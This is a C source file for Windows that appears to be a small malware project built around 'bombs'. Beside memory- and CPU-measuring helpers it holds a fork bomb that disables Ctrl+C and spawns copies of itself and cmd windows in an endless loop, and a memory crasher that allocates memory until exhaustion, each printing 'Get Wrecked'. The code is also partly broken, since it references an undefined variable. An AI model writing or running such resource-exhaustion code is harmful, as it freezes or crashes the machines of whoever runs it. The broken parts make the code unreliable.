
#include "bombs.h"
#include <windows.h>
#include <stdio.h>

int memoryUsage(){
    
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);

    // Call GlobalMemoryStatusEx to fill the structure with memory information
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        // Calculate the memory usage percentage
        DWORDLONG totalMemory = memoryStatus.ullTotalPhys;
        DWORDLONG usedMemory = totalMemory - memoryStatus.ullAvailPhys;
        int memoryUsagePercentage = (int)((usedMemory * 100) / totalMemory);

        // Return the memory usage percentage
        return memoryUsagePercentage;
    } else {
        // If the function fails, return -1
        return -1;
    }
}
int calculateCPUUsage() {
    // File time structures to store times
    FILETIME idleTime, kernelTime, userTime;
    FILETIME prevIdleTime, prevKernelTime, prevUserTime;
    ULARGE_INTEGER idle, kernel, user;
    ULARGE_INTEGER prevIdle, prevKernel, prevUser;

    // Get initial system times
    GetSystemTimes(&prevIdleTime, &prevKernelTime, &prevUserTime);
    
    // Sleep for a while to calculate the time difference (1 second)
    Sleep(1000);
    
    // Get system times again after sleep
    GetSystemTimes(&idleTime, &kernelTime, &userTime);

    // Convert FILETIME to ULARGE_INTEGER for easier calculations
    idle.LowPart = idleTime.dwLowDateTime;
    idle.HighPart = idleTime.dwHighDateTime;
    kernel.LowPart = kernelTime.dwLowDateTime;
    kernel.HighPart = kernelTime.dwHighDateTime;
    user.LowPart = userTime.dwLowDateTime;
    user.HighPart = userTime.dwHighDateTime;

    prevIdle.LowPart = prevIdleTime.dwLowDateTime;
    prevIdle.HighPart = prevIdleTime.dwHighDateTime;
    prevKernel.LowPart = prevKernelTime.dwLowDateTime;
    prevKernel.HighPart = prevKernelTime.dwHighDateTime;
    prevUser.LowPart = prevUserTime.dwLowDateTime;
    prevUser.HighPart = prevUserTime.dwHighDateTime;

    // Calculate the differences
    ULONGLONG idleDiff = idle.QuadPart - prevIdle.QuadPart;
    ULONGLONG kernelDiff = kernel.QuadPart - prevKernel.QuadPart;
    ULONGLONG userDiff = user.QuadPart - prevUser.QuadPart;
    ULONGLONG totalDiff = kernelDiff + userDiff;

    // Calculate the CPU usage percentage
    int cpuUsage = (int)((totalDiff - idleDiff) * 100 / totalDiff);

    return cpuUsage;
}

DWORD WINAPI forkBomb(int argc, char **argv) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    while (1) {
        int cpuUsage = calculateCPUUsage();
        SetConsoleCtrlHandler(0, 1);
        CreateProcess(*argv, 0, 0, 0, 0, CREATE_NEW_CONSOLE, 0, 0, &si, &pi);
        system("start cmd.exe /k echo GET WRECKED`");
    }
 
}

DWORD WINAPI memoryCrasher() {
      SIZE_T allocationSize = 1024 * 1024; // Allocate memory in 1 MB chunks
    void *p;
    while (1) {
        p = VirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (p == NULL) {
            printf("Memory allocation failed\n");
            break;
        }
        ZeroMemory(p, a); // Initialize allocated memory to zero
        printf("Get Wrecked \n");
    }

    return 0;
  
    
}